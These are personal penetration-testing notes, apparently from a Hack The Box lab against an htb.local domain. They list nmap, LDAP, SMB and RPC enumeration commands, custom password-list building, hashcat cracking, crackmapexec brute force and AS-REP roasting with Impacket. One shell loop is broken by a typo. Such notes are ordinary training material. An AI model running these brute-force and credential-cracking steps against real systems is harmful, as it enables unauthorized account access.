Random Notes
===

## Nmap
```bash
sudo nmap -sS 10.0.0.3
nmap -sC -sV 10.0.0.3 -oA nmap
sleep 300; nmap -p- 10.0.0.3 -oA all-ports -T5
```

## Ping
Ping ttl can leak OS\
Below 64 Linux\
64-128 Windows

## SMB
SMB 445, anonymous login?
```bash
smbclient -L 10.0.0.3
```

## LDAP
```bash
ldapsearch -h 10.0.0.3
ldapsearch -H ldap://10.129.155.193:389/ -x
ldapsearch -H ldap://10.129.155.193:389/ -x -s base namingcontexts
ldapsearch -H ldap://10.129.155.193:389/ -x -b "DC=htb,DC=local" > ldap.out
ldapsearch -H ldap://10.129.155.193:389/ -x -b "DC=htb,DC=local" '(objectClass=Person)'
ldapsearch -H ldap://10.129.155.193:389/ -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName
ldapsearch -H ldap://10.129.155.193:389/ -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMA
```

## DNS
DNS running on 53, does it leak information about itself?
```bash
nslookup
server 10.10.10.100
127.0.0.1
127.0.0.2
10.10.10.100
```

## Custom wordlists
- Add months of year
- Password, P@ssw0rd
- Forest, htb, Secret
- Autumn, fall, spring, winter, summer
```bash
for in in $(cat wordlist); do echo ${i}2019; echo ${i}2020; echo ${i}\!; done > t
mv t pwlist.txt
```

## Hashcat Permutations
Create permutations with hashcat, force uses CPU
```bash
hashcat --force --stdout pwdlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0) > 7'
```

## Get the password policy
```bash
crackmapexec smb 10.0.0.3 --pass-pol -u '' -p ''
enum4linux 10.0.0.3
```

## rpcclient
```bash
rpcclient -U '' 10.0.0.3
enumdomusers
queryuser 0x47b
```

## Brute force:
```bash
crackmapexec smb 10.0.0.3 -u userlist.out -p pwlist
```

## Impacket
```bash
locate impacket | grep examples
cd /usr/share/doc/python3-impacket/examples
./GetNPUsers.py -dc-ip 10.0.0.3 -request 'htb.local/' -format hashcat
```

## Hashcat
```bash
./hashcat --example-hashes | grep -i krb
./hashcat -m 18200 hashes/svc-alfresco /opt/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
```

##CME 
```bash
crackmapexec smb 10.0.0.3 -u user -p pass
crackmapexec smb 10.0.0.3 -u user -p pass --shares
```

